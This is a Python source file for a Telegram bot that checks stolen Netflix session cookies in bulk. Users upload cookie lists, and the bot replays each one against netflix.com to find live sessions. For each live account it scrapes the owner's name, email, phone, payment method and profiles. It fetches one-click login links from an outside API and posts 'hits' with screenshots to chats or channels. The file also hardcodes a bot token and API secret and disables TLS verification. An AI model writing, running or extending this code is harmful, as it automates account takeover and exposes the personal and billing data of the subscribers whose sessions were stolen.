import requests
import logging
import time
import urllib.parse
import io
import os
import sys
import re
import json
import threading
import telebot
import zipfile
import codecs
import concurrent.futures
from playwright.sync_api import sync_playwright
from telebot import types
from datetime import datetime, timedelta
import urllib3
from flask import Flask
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    # Fallback if colorama isn't installed yet (runner.bat handles this)
    class Fore: GREEN = ""; RED = ""; YELLOW = ""; CYAN = ""; RESET = ""
    class Style: BRIGHT = ""

# Suppress SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Suppress Flask/Werkzeug Logs (Cleaner Console)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Bot State & Configuration
user_modes = {}
BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
ADMIN_ID = 6176299339
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
USERS_FILE = "users.txt"
SCREENSHOT_SEMAPHORE = threading.Semaphore(5) # Increased to 5 for faster screenshots

# ==========================================
# WEB SERVER (KEEP ALIVE)
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is Running! 24/7"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
    t.daemon = True
    t.start()

# ==========================================
# CONFIGURATION & HEADERS
# ==========================================
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Sec-Ch-Ua": '"Chromium";v="142", "Google Chrome";v="142", "Not-A.Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Referer": "https://www.netflix.com/",
    "Origin": "https://www.netflix.com",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
}

# API Configuration
API_URL = "https://api.kamalxd.com/api/gen"
SECRET_KEY = "313ksLqTcHs00omjL8pKZYkZmz7un39w"

# Comprehensive Currency Map
CURRENCY_MAP = {
    "US": "$", "GB": "£", "IN": "₹", "CA": "C$", "AU": "A$", "BR": "R$", 
    "MX": "Mex$", "TR": "₺", "ES": "€", "FR": "€", "DE": "€", "IT": "€", 
    "NL": "€", "PL": "zł", "AR": "ARS$", "CO": "COP$", "CL": "CLP$", 
    "PE": "S/", "JP": "¥", "KR": "₩", "TW": "NT$", "ZA": "R", "NG": "₦", 
    "KE": "KSh", "EG": "E£", "SA": "SAR", "AE": "AED", "PK": "Rs", 
    "ID": "Rp", "MY": "RM", "PH": "₱", "VN": "₫", "TH": "฿", "SG": "S$", 
    "NZ": "NZ$", "HK": "HK$", "CH": "CHF", "SE": "kr", "NO": "kr", 
    "DK": "kr", "RU": "₽", "UA": "₴", "CZ": "Kč", "HU": "Ft", "RO": "lei",
    "PT": "€", "IE": "€", "BE": "€", "AT": "€", "FI": "€", "GR": "€"
}

def get_country_from_html(html):
    """Extracts current country from Netflix HTML response."""
    try:
        if '"currentCountry":"' in html:
            return html.split('"currentCountry":"')[1].split('"')[0]
    except:
        pass
    return "Unknown"

def get_flag(code):
    """Converts country code to flag emoji."""
    if not code or code == "Unknown" or len(code) != 2:
        return ""
    return "".join([chr(ord(c.upper()) + 127397) for c in code])

def get_currency_symbol(code):
    """Returns currency symbol for country code."""
    return CURRENCY_MAP.get(code, "$")

def clean_text(text):
    """Decodes unicode escapes (e.g. \uC5C4) and cleans text."""
    if not text: return "Unknown"
    try:
        return codecs.decode(text, 'unicode_escape')
    except:
        return text

def unix_to_date(timestamp):
    """Converts Unix timestamp to readable date."""
    try:
        ts = int(timestamp)
        if ts > 1e12: ts = ts / 1000
        return datetime.fromtimestamp(ts).strftime('%Y-%m-%d')
    except:
        return "N/A"

def calculate_duration(member_since_str):
    """Calculates duration from member since date."""
    try:
        since_date = datetime.strptime(member_since_str, '%Y-%m-%d')
        diff = datetime.now() - since_date
        return f"({diff.days // 365}y {(diff.days % 365) // 30}m)"
    except:
        return ""

def extract_deep_details(html):
    """Parses HTML for deep account details (Plan, Payment, Profiles)."""
    details = {
        "plan": "Unknown",
        "payment": "Unknown",
        "expiry": "N/A",
        "email": "N/A",
        "phone": "N/A",
        "country": "Unknown",
        "currency": "",
        "price": "N/A",
        "quality": "Unknown",
        "name": "Unknown",
        "extra_members": "Unknown",
        "member_since": "Unknown",
        "max_streams": "Unknown",
        "profiles": [],
        "is_dvd": False,
        "auto_renew": "Off ❌",
        "has_ads": "No",
        "has_pins": False,
        "status": "Unknown", # CURRENT_MEMBER, FORMER_MEMBER, NEVER_MEMBER
        "email_verified": "Unknown",
        "phone_verified": "Unknown"
    }
    
    # 1. Membership Status (Crucial for validity)
    if '"membershipStatus":"CURRENT_MEMBER"' in html or '"CURRENT_MEMBER":true' in html:
        details["status"] = "Active"
    elif '"membershipStatus":"FORMER_MEMBER"' in html or '"FORMER_MEMBER":true' in html:
        details["status"] = "Expired"
    elif '"membershipStatus":"NEVER_MEMBER"' in html or '"NEVER_MEMBER":true' in html:
        details["status"] = "Free/Never Paid"
    
    # Check for PINs (Profile Locks)
    if '"isProfileLocked":true' in html:
        details["has_pins"] = True
    
    # Plan Name
    # Regex from SVB: "localizedPlanName":{"fieldType":"String","value":"..."}
    plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if plan_match: 
        details["plan"] = clean_text(plan_match.group(1))
    elif re.search(r'"currentPlanName":"([^"]+)"', html):
        details["plan"] = clean_text(re.search(r'"currentPlanName":"([^"]+)"', html).group(1))
    elif re.search(r'data-uia="plan-label">([^<]+)<', html):
        # Fallback to HTML UI
        details["plan"] = clean_text(re.search(r'data-uia="plan-label">([^<]+)<', html).group(1))
    
    # Check for Ads
    if "with ads" in str(details["plan"]).lower():
        details["has_ads"] = "Yes"

    # Video Quality
    qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if qual_match: details["quality"] = clean_text(qual_match.group(1))
    
    # Quality Fallback (Infer from Plan)
    if details["quality"] == "Unknown":
        plan_lower = str(details["plan"]).lower()
        if "premium" in plan_lower: details["quality"] = "UHD 4K"
        elif "standard" in plan_lower: details["quality"] = "Full HD"
        elif "basic" in plan_lower: details["quality"] = "HD"
        elif "mobile" in plan_lower: details["quality"] = "SD (Mobile)"
    
    # Max Streams
    streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html)
    if streams_match: details["max_streams"] = streams_match.group(1)

    # Plan Price & Currency
    # Regex: "planPrice":{"fieldType":"String","value":"..."}
    price_match = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if price_match:
        details["price"] = clean_text(price_match.group(1))
    else:
        # Fallback: localizedPrice
        loc_price = re.search(r'"localizedPrice":"([^"]+)"', html)
        if loc_price: details["price"] = clean_text(loc_price.group(1))

    # 2. Payment Method
    # Regex: "paymentMethod":{"fieldType":"String","value":"..."}
    pm_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if pm_match:
        details["payment"] = clean_text(pm_match.group(1))
    else:
        # Check for specific card types in UI
        if "Visa" in html: details["payment"] = "Visa 💳"
        elif "MasterCard" in html or "Mastercard" in html: details["payment"] = "MasterCard 💳"
        elif "PayPal" in html: details["payment"] = "PayPal 🅿️"
        elif "Amex" in html: details["payment"] = "Amex 💳"
        elif "DCB" in html: details["payment"] = "Mobile Bill (DCB) 📱"
    
    # 3. Contact Info
    # Name
    name_match = re.search(r'"userContext":\{"name":"([^"]+)"', html)
    if name_match: details["name"] = clean_text(name_match.group(1))
    elif re.search(r'"firstName":"([^"]+)"', html):
        details["name"] = clean_text(re.search(r'"firstName":"([^"]+)"', html).group(1))
    elif re.search(r'data-uia="account-owner-name">([^<]+)<', html):
        details["name"] = clean_text(re.search(r'data-uia="account-owner-name">([^<]+)<', html).group(1))
    elif re.search(r'"accountOwnerName":"([^"]+)"', html):
        details["name"] = clean_text(re.search(r'"accountOwnerName":"([^"]+)"', html).group(1))
    
    # Email (Often hidden, but sometimes in source)
    # Improved Email Extraction
    email_match = re.search(r'"email":"([^"]+)"', html)
    if email_match: 
        details["email"] = clean_text(email_match.group(1))
    else:
        # Fallback patterns
        uc_match = re.search(r'"userContext":\{[^}]*"email":"([^"]+)"', html)
        if uc_match: 
            details["email"] = clean_text(uc_match.group(1))
        else:
            # Try userLoginId (Common in source)
            login_id_match = re.search(r'"userLoginId":"([^"]+)"', html)
            if login_id_match:
                details["email"] = clean_text(login_id_match.group(1))
            elif re.search(r'data-uia="account-email">([^<]+)<', html):
                details["email"] = clean_text(re.search(r'data-uia="account-email">([^<]+)<', html).group(1))
            elif re.search(r'"emailAddress":"([^"]+)"', html):
                details["email"] = clean_text(re.search(r'"emailAddress":"([^"]+)"', html).group(1))
            elif re.search(r'"memberEmail":"([^"]+)"', html):
                details["email"] = clean_text(re.search(r'"memberEmail":"([^"]+)"', html).group(1))
            elif re.search(r'"userEmail":"([^"]+)"', html):
                details["email"] = clean_text(re.search(r'"userEmail":"([^"]+)"', html).group(1))

    # Email Verified
    if '"isEmailVerified":true' in html: details["email_verified"] = "Yes ✅"
    elif '"isEmailVerified":false' in html: details["email_verified"] = "No ❌"

    # Phone Verified (Infer from UI if possible, or generic)
    # Usually not explicitly in source as boolean, but we can assume No if not present
    if details["phone"] != "N/A": details["phone_verified"] = "Yes ✅" # Assumption if number exists
    
    # Phone
    phone_match = re.search(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"\}', html)
    if phone_match: details["phone"] = clean_text(phone_match.group(1))
    
    # Billing
    # Regex: "nextBillingDate":{"fieldType":"String","value":"..."}
    bill_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if bill_match:
        details["expiry"] = clean_text(bill_match.group(1))
        details["auto_renew"] = "On ✅"
    
    # Member Since
    since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
    if since_match:
        details["member_since"] = unix_to_date(since_match.group(1))
        details["member_duration"] = calculate_duration(details["member_since"])
    elif "memberSince" in html:
         # Fallback regex
         ms_ui = re.search(r'data-uia="member-since">.*?Member Since ([^<]+)', html)
         if ms_ui: details["member_since"] = clean_text(ms_ui.group(1))
    
    # Country (Deep check)
    country_match = re.search(r'"currentCountry":"([^"]+)"', html)
    if country_match: details["country"] = country_match.group(1)
    
    # Extra Members
    extra_match = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}', html)
    if extra_match and extra_match.group(1) == "true":
        details["extra_members"] = "Yes (Slot Available)"
    else:
        details["extra_members"] = "No ❌"

    # 4. Profiles (Enhanced)
    details["profiles"] = []
    # Robust Regex for JSON objects to capture Name + Lock Status
    # Matches { ... "name":"X" ... "isProfileLocked":true ... }
    
    # Pattern 1: name before lock
    p1 = re.findall(r'\{[^}]*?"name":"([^"]+)"[^}]*?"isProfileLocked":(true|false)[^}]*?"isKids":(true|false)[^}]*?\}', html)
    # Pattern 2: lock before name
    # Simplified regex for robustness if order varies greatly
    
    # Merge and Format
    # We will use p1 as it covers the standard JSON structure in Netflix source
    if p1:
        for name, locked, kids in p1:
            status = "🔒" if locked == "true" else "🔓"
            kid_status = "👶" if kids == "true" else ""
            details["profiles"].append(f"{clean_text(name)} {status} {kid_status}")
    else:
        # Fallback simple names
        simple_names = re.findall(r'"profileName":"([^"]+)"', html)
        for name in list(set(simple_names)):
            details["profiles"].append(f"{clean_text(name)}")

    # Profiles Fallback (UI Scraping)
    if not details["profiles"]:
        ui_profiles = re.findall(r'class="profile-name">([^<]+)<', html)
        if ui_profiles:
            details["profiles"] = [clean_text(p) for p in ui_profiles]

    # Fallback: If Owner Name is still Unknown, use the first profile name
    if details["name"] == "Unknown" and details["profiles"]:
        details["name"] = details["profiles"][0].split(' ')[0]

    return details

def get_magic_link_api(netflix_id):
    """Fetches Magic Link using KamalXD API."""
    try:
        # Clean the ID if needed
        if "NetflixId=" in netflix_id:
            netflix_id = netflix_id.split("NetflixId=")[1].split(";")[0].strip()
            
        payload = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        resp = requests.post(API_URL, json=payload, headers=headers, timeout=15)
        return resp.json()
    except Exception as e:
        pass # Suppress API errors since domain is down
    return None

def check_cookie(cookie_input):
    """
    Validates the Netflix cookie using the Browser Simulation method.
    Returns a dictionary with status and details.
    """
    # Smart Cookie Handling
    cookie_input = cookie_input.strip()
    
    # 1. Try to handle JSON cookies
    if cookie_input.startswith('[') or cookie_input.startswith('{'):
        try:
            json_c = json.loads(cookie_input)
            if isinstance(json_c, list):
                for c in json_c:
                    if c.get('name') == 'NetflixId':
                        cookie_input = c.get('value')
                        break
            elif isinstance(json_c, dict):
                if 'NetflixId' in json_c:
                    cookie_input = json_c['NetflixId']
        except:
            pass

    # 2. Decode URL encoded cookies
    if "%" in cookie_input:
        cookie_input = urllib.parse.unquote(cookie_input)

    # Remove "Cookie:" prefix if present
    if cookie_input.lower().startswith("cookie:"):
        cookie_input = cookie_input.split(":", 1)[1].strip()
    
    # Prepare cookies for Playwright
    cookie_str = cookie_input
    if "NetflixId" not in cookie_input and len(cookie_input) > 50 and "=" not in cookie_input:
        cookie_str = f"NetflixId={cookie_input}"

    # Extract NetflixId for API
    netflix_id_val = None
    nid_match = re.search(r"NetflixId=([^;]+)", cookie_str)
    if nid_match:
        netflix_id_val = nid_match.group(1)
    elif "NetflixId" not in cookie_str and len(cookie_str) > 50:
        netflix_id_val = cookie_str.strip()
    
    playwright_cookies = []
    try:
        for chunk in cookie_str.split(';'):
            if '=' in chunk:
                parts = chunk.strip().split('=', 1)
                if len(parts) == 2:
                    playwright_cookies.append({
                        'name': parts[0],
                        'value': parts[1],
                        'domain': '.netflix.com',
                        'path': '/'
                    })
    except:
        return {"valid": False, "msg": "Cookie Parse Error"}

    # Call API for Magic Link (Optimistic)
    api_response = None
    api_link = None
    if netflix_id_val:
        api_response = get_magic_link_api(netflix_id_val)
        if api_response and api_response.get("success"):
            api_link = api_response.get("login_url")

    # --- FAST REQUESTS CHECK (No Browser) ---
    try:
        session = requests.Session()
        session.headers.update(HEADERS)
        session.verify = False # Match netflixSVBtoPYTHON behavior
        
        # Set cookies in session
        for c in playwright_cookies:
            session.cookies.set(c['name'], c['value'], domain=c['domain'])

        # 1. Check Validity (Fast Redirect Check)
        # We check /browse. If it redirects to /login, cookie is dead.
        resp = session.get("https://www.netflix.com/browse", timeout=10, allow_redirects=False)
        
        if resp.status_code == 302 and "login" in resp.headers.get("Location", ""):
             return {"valid": False, "msg": "Redirected to Login (Dead)"}
        
        # Double check if 200 OK but actually a login page (soft redirect)
        if resp.status_code == 200 and "login" in resp.url:
             return {"valid": False, "msg": "Redirected to Login (Dead)"}

        # 2. Extract Deep Details (From /YourAccount)
        # This page contains JSON data in the HTML source about the plan, billing, etc.
        # Using /account endpoint as per netflixSVBtoPYTHON
        resp_acc = session.get("https://www.netflix.com/account", timeout=15)
        acc_html = resp_acc.text
        
        # Use our regex extractor
        deep_data = extract_deep_details(acc_html)
        
        # Determine Country
        country = get_country_from_html(acc_html)
        if deep_data["country"] != "Unknown":
            country = deep_data["country"]

        # Fallback email from API if scraper failed
        if deep_data["email"] == "N/A" and api_response and api_response.get("email"):
             deep_data["email"] = api_response.get("email")

        # Magic Link Logic
        magic_link = "Token Not Found"
        token_source = "None"
        
        if api_link:
            magic_link = api_link
            token_source = "KamalXD API"
        
        # Check Account Status
        if deep_data["status"] == "Expired":
            return {"valid": False, "msg": "Session Valid but Account Expired (Former Member)"}
        elif deep_data["status"] == "Free/Never Paid":
            return {"valid": False, "msg": "Session Valid but No Subscription (Never Member)"}

        # 3. Image System (Screenshot) - Only if valid
        screenshot_bytes = None
        try:
            # Use Semaphore to limit concurrent browser instances
            # Changed to blocking with timeout so we don't skip screenshots, just wait a bit
            if SCREENSHOT_SEMAPHORE.acquire(timeout=20):
                try:
                    with sync_playwright() as p:
                        browser = p.chromium.launch(headless=True)
                        context = browser.new_context(
                            user_agent=HEADERS['User-Agent'],
                            viewport={'width': 1280, 'height': 720}
                        )
                        # Add cookies
                        context.add_cookies(playwright_cookies)
                        page = context.new_page()
                        # Wait for network idle to ensure full load
                        page.goto("https://www.netflix.com/browse", timeout=30000, wait_until='domcontentloaded')
                        try: page.wait_for_timeout(3000) # Increased to 3s for better loading
                        except: pass
                        screenshot_bytes = page.screenshot(type='jpeg', quality=70)
                        browser.close()
                finally:
                    SCREENSHOT_SEMAPHORE.release()
        except Exception as e:
            print(f"Screenshot Error: {e}")

        return {
            "valid": True,
            "country": country,
            "magic_link": magic_link,
            "data": deep_data,
            "token_source": token_source,
            "screenshot": screenshot_bytes
        }
        
    except Exception as e:
        # Fallback: If API worked but Browser failed, return API Hit
        if api_link:
            return {
                "valid": True,
                "country": api_response.get("country", "Unknown"),
                "magic_link": api_link,
                "data": {
                    "email": api_response.get("email", "Unknown"),
                    "plan": api_response.get("plan", "Premium"),
                    "country": api_response.get("country", "Unknown"),
                    "price": api_response.get("price", "Unknown"),
                    "quality": "UHD",
                    "max_streams": "4",
                    "payment": "Unknown",
                    "expiry": "Unknown",
                    "status": "Active"
                },
                "token_source": "KamalXD API (Rescue)",
                "screenshot": None
            }
        return {"valid": False, "msg": f"Error: {str(e)}"}

def main():
    print(f"{Fore.RED}========================================")
    print(f"{Fore.WHITE}   NETFLIX COOKIE CHECKER BOT (TG)      ")
    print(f"{Fore.RED}========================================{Style.RESET_ALL}\n")
    keep_alive()

    # Initialize Bot
    bot = telebot.TeleBot(BOT_TOKEN)
    telebot.apihelper.RETRY_ON_ERROR = True # Auto-retry on network errors
    print(f"\n{Fore.GREEN}[+] Bot Started! Send cookies to your bot now.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] NOTE: If you see 'Conflict' errors, STOP the bot on your PC/Laptop!{Style.RESET_ALL}")

    # Load users into memory for 100x faster checking
    user_db = set()
    user_lock = threading.Lock()
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f:
                user_db = set(f.read().splitlines())
        except: pass

    # --- HELPER FUNCTIONS ---
    def save_user(user_id):
        uid = str(user_id)
        if uid not in user_db:
            with user_lock:
                if uid not in user_db:
                    user_db.add(uid)
                    try:
                        with open(USERS_FILE, "a+") as f:
                            f.write(f"{uid}\n")
                    except: pass

    def check_sub(user_id):
        if user_id == ADMIN_ID: return True
        for channel in CHANNELS:
            try:
                stat = bot.get_chat_member(channel, user_id).status
                if stat not in ['creator', 'administrator', 'member']:
                    return False
            except:
                return False
        return True

    def send_force_join(chat_id):
        markup = types.InlineKeyboardMarkup()
        for ch in CHANNELS:
            markup.add(types.InlineKeyboardButton(text=f"Join {ch}", url=f"https://t.me/{ch.replace('@', '')}"))
        markup.add(types.InlineKeyboardButton(text="✅ Verify Join", callback_data="verify_join"))
        bot.send_message(chat_id, "⚠️ **You must join our channels to use this bot!**", reply_markup=markup, parse_mode='Markdown')

    # --- HANDLERS ---
    @bot.message_handler(commands=['start'])
    def start(message):
        save_user(message.chat.id)
        if not check_sub(message.chat.id):
            return send_force_join(message.chat.id)
            
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.add("📩 Send Here (DM)", "📡 Send to Channel")
        kb.add("🛑 Stop System")
        
        welcome_msg = (
            "**🔥 Netflix Direct Scraper V32**\n\n"
            "👋 **Welcome!** Here is how to use this bot:\n\n"
            "1️⃣ **Select a Mode** using the buttons below.\n"
            "2️⃣ **Send your Netflix Cookies** (Text or File).\n\n"
            "🍪 **Supported Format:**\n"
            "• `NetflixId=v2...`\n\n"
            "📝 **Example:**\n"
            "`NetflixId=v2.CT...`\n\n"
            "👇 **Select Mode to Begin:**"
        )
        bot.send_message(message.chat.id, welcome_msg, reply_markup=kb, parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
    def verify_join(call):
        if check_sub(call.message.chat.id):
            bot.delete_message(call.message.chat.id, call.message.message_id)
            kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            kb.add("📩 Send Here (DM)", "📡 Send to Channel")
            kb.add("🛑 Stop System")
            bot.send_message(call.message.chat.id, "**✅ Verified!**\n**🔥 Netflix Direct Scraper V32**\nSelect Mode:", reply_markup=kb, parse_mode='Markdown')
        else:
            bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)

    @bot.message_handler(commands=['users', 'stats'])
    def user_stats(message):
        if message.chat.id != ADMIN_ID: return
        try:
            count = 0
            if os.path.exists(USERS_FILE):
                with open(USERS_FILE, "r") as f:
                    count = len(f.read().splitlines())
            bot.reply_to(message, f"📊 **Total Users:** {count}")
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    @bot.message_handler(commands=['broadcast'])
    def broadcast(message):
        if message.chat.id != ADMIN_ID: return
        msg = bot.reply_to(message, "📝 **Send the message (Text, Image, File) to broadcast:**")
        bot.register_next_step_handler(msg, perform_broadcast)

    def perform_broadcast(message):
        try:
            if not os.path.exists(USERS_FILE):
                return bot.reply_to(message, "❌ No users found.")
            with open(USERS_FILE, "r") as f:
                users = f.read().splitlines()
            count = 0
            for uid in users:
                try:
                    if message.content_type == 'text':
                        bot.send_message(uid, message.text)
                    elif message.content_type == 'photo':
                        bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption)
                    elif message.content_type == 'document':
                        bot.send_document(uid, message.document.file_id, caption=message.caption)
                    elif message.content_type == 'video':
                        bot.send_video(uid, message.video.file_id, caption=message.caption)
                    elif message.content_type == 'audio':
                        bot.send_audio(uid, message.audio.file_id, caption=message.caption)
                    elif message.content_type == 'voice':
                        bot.send_voice(uid, message.voice.file_id, caption=message.caption)
                    count += 1
                except: pass
            bot.reply_to(message, f"✅ **Broadcast sent to {count} users.**")
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    @bot.message_handler(func=lambda m: m.text == "🛑 Stop System")
    def stop_sys(message):
        if message.chat.id in user_modes:
            user_modes[message.chat.id]['stop'] = True
        else:
            user_modes[message.chat.id] = {'stop': True}
        bot.reply_to(message, "**🛑 Scanning Stopped.**", parse_mode='Markdown')

    @bot.message_handler(func=lambda m: m.text == "📩 Send Here (DM)")
    def mode_dm(message):
        user_modes[message.chat.id] = {'target': message.chat.id, 'stop': False}
        bot.reply_to(message, "**✅ DM Mode Active.** Send file or text now.", parse_mode='Markdown')

    @bot.message_handler(func=lambda m: m.text == "📡 Send to Channel")
    def mode_ch(message):
        msg = bot.reply_to(message, "**📡 Enter Channel ID** (e.g., -100xxxx):", parse_mode='Markdown')
        bot.register_next_step_handler(msg, save_ch)

    def save_ch(message):
        try:
            chat_id = int(message.text.strip())
            user_modes[message.chat.id] = {'target': chat_id, 'stop': False}
            bot.reply_to(message, "**✅ Channel Verified.** Hits will be sent there.", parse_mode='Markdown')
        except:
            bot.reply_to(message, "❌ Invalid ID.")

    @bot.message_handler(content_types=['document', 'text'])
    def handle_input(message):
        uid = message.chat.id
        save_user(uid) # Save user automatically when they send any message
        if not check_sub(uid):
            return send_force_join(uid)
            
        mode = user_modes.get(uid)
        
        # Ignore buttons/commands
        if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System"]): return
        
        if not mode: return bot.reply_to(message, "❌ **Select a mode first!**", parse_mode='Markdown')
        if mode.get('stop'): 
            # Auto-resume if they send a file, or ask to resume? 
            # User asked to fix stop system. Let's require button press or just resume.
            # Better to ask to select mode to confirm destination.
            return bot.reply_to(message, "🛑 **System is stopped.**\nClick a Mode button to resume.")

        cookies = []
        try:
            if message.content_type == 'document':
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                
                if message.document.file_name.endswith('.zip'):
                    with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                        for filename in z.namelist():
                            if filename.endswith('.txt'):
                                with z.open(filename) as f:
                                    cookies.extend(f.read().decode('utf-8', errors='ignore').splitlines())
                else:
                    cookies = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            else:
                cookies = message.text.splitlines()
            
            # Filter valid cookies first
            valid_cookies = [c.strip() for c in cookies if len(c.strip()) > 50 and ("NetflixId" in c or "netflix" in c.lower() or "=" in c)]
            
            if not valid_cookies: return bot.reply_to(message, "❌ **No Valid Cookies Found!**", parse_mode='Markdown')

            bot.reply_to(message, f"🚀 **Checking {len(valid_cookies)} Cookies...**\n_Task started in background._", parse_mode='Markdown')
            
            def background_checker(cookies, chat_id, target):
                valid_count = 0
                hits_list = [] # Store hits for summary file

                def process_cookie(cookie):
                    if user_modes.get(chat_id, {}).get('stop'): return None
                    try:
                        res = check_cookie(cookie)
                        if res["valid"]:
                            print(f"{Fore.GREEN}[+] Hit: {cookie[:15]}... | {res['country']}{Style.RESET_ALL}")
                            send_hit(target, res, cookie)
                            return (res, cookie) # Return result for file
                    except: pass
                    return None

                # Using 15 workers per user for faster checking (Semaphore protects RAM)
                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                    futures = [executor.submit(process_cookie, c) for c in cookies]
                    for future in concurrent.futures.as_completed(futures):
                        if user_modes.get(chat_id, {}).get('stop'): break
                        result = future.result()
                        if result:
                            valid_count += 1
                            hits_list.append(result)
                
                # Generate and Send Summary File
                if hits_list:
                    try:
                        summary = f"========================================\nNETFLIX HITS SUMMARY\nAdmin: https://t.me/F88UF\nChannel: https://t.me/F88UF9844\n========================================\n\n"
                        for res, cookie in hits_list:
                            data = res.get("data", {})
                            summary += f"Country: {res.get('country', 'Unknown')}\n"
                            summary += f"Email: {data.get('email', 'N/A')}\n"
                            summary += f"Plan: {data.get('plan', 'N/A')}\n"
                            summary += f"Login: {res.get('magic_link', 'N/A')}\n"
                            summary += f"Cookie: {cookie}\n"
                            summary += "-"*40 + "\n"
                        summary += "\n========================================\nJoin Channel: https://t.me/F88UF9844\n========================================"
                        
                        with io.BytesIO(summary.encode('utf-8')) as f:
                            f.name = f"Netflix_Hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                            bot.send_document(chat_id, f, caption="📂 **Here is your Hits Summary File**")
                    except Exception as e:
                        print(f"Summary Error: {e}")

                try:
                    bot.send_message(chat_id, f"✅ **Check Complete.** Hits: {valid_count}", parse_mode="Markdown")
                except: pass

            # Start background thread to prevent blocking other users
            threading.Thread(target=background_checker, args=(valid_cookies, uid, mode['target'])).start()

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    def send_hit(chat_id, res, cookie):
        data = res.get("data", {})
        
        # Helper to escape Markdown (Legacy)
        def esc(t):
            return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")

        country_code = res.get('country', 'Unknown')
        flag = get_flag(country_code)
        currency_sym = get_currency_symbol(country_code)
        
        # Format Price
        price = data.get('price', 'Unknown')
        if price != 'Unknown' and currency_sym not in price:
            price = f"{currency_sym} {price}"
            
        
        # Create Inline Keyboard
        markup = types.InlineKeyboardMarkup()
        login_url = res.get('magic_link', 'Token Not Found')
        
        if login_url and "http" in login_url and login_url != "Token Not Found":
            btn_login = types.InlineKeyboardButton("🔗 Login (Magic Link)", url=login_url)
            markup.add(btn_login)
        else:
            login_url = "https://www.netflix.com/login" # Fallback for text link
        
        # Generate timestamps
        gen_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        exp_time = (datetime.now() + timedelta(hours=1)).strftime('%Y-%m-%d %H:%M:%S')
        
        # Dynamic Message Construction (Ultimate Design)
        lines = []
        lines.append("🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟")
        lines.append("")
        
        # Status & Region
        lines.append(f"🟢 **STATUS:** Active ✅")
        if country_code != "Unknown":
            lines.append(f"🌍 **REGION:** {esc(country_code)} {flag}")
            
        # Member Since & Owner
        if data.get('member_since') and data['member_since'] != "Unknown":
            duration = data.get('member_duration', '')
            lines.append(f"⏰ **MEMBER SINCE:** {esc(data['member_since'])} {esc(duration)}")
        
        lines.append(f"👤 **OWNER:** {esc(data.get('name', 'Unknown'))}")
        
        # Plan & Payment
        lines.append(f"👑 **PLAN:** {esc(data.get('plan', 'Premium'))}")
        if price != "Unknown" and price != "N/A":
            lines.append(f"💰 **PRICE:** {esc(price)}")
        
        payment_info = data.get('payment', 'Unknown')
        lines.append(f"💳 **PAYMENT:** {esc(payment_info)}")
        
        if data.get('expiry') and data['expiry'] != "N/A":
            lines.append(f"📅 **NEXT BILLING:** {esc(data['expiry'])}")
            
        # Profiles
        if data.get('profiles'):
            profile_str = ", ".join(data['profiles'])
            lines.append(f"🎭 **PROFILES:** {esc(profile_str)}")
            
        # Contact Info
        lines.append(f"📧 **EMAIL:** {esc(data.get('email', 'N/A'))}")
        if data.get('email_verified') != "Unknown":
            lines.append(f"   └ {esc(data['email_verified'])} Verified")
            
        lines.append(f"☎️ **PHONE:** {esc(data.get('phone', 'N/A'))}")
        
